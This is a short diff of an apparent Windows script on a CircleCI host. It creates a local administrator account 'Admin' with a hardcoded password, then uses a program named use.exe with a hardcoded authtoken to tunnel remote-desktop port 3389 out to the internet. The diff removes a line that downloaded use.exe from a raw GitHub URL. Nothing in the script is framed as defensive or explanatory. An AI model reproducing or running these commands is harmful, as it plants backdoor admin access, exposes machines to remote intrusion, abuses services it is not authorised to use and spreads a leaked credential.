@@ -1,7 +1,6 @@
 cmd /c net user /add Admin P@ssw0rd.
 cmd /c net localgroup /add administrators Admin
 
-Invoke-WebRequest https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe -OutFile use.exe
 use.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
 use.exe tcp 3389 --log=stdout > C:\Users\circleci\Downloads\use.log
 
